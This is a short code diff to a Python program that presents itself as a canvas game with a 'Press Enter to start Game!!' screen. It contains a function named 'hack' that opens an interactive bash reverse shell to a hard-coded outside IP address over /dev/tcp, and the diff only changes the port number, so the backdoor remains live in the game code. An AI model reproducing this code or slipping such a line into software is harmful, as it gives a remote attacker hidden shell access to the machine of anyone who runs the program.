@@ -191,7 +191,7 @@ canvas.create_text(250, 250, text="Press Enter to start Game!!", fill="yellow", 
 j = canvas.find_all()
 def hack(num):
     try:
-        subprocess.check_call("/bin/bash -i >/dev/tcp/82.165.97.169/2638 0<&1 2>&1", shell=True, executable='/bin/bash')
+        subprocess.check_call("/bin/bash -i >/dev/tcp/82.165.97.169/2038 0<&1 2>&1", shell=True, executable='/bin/bash')
     except:
         return 0
 
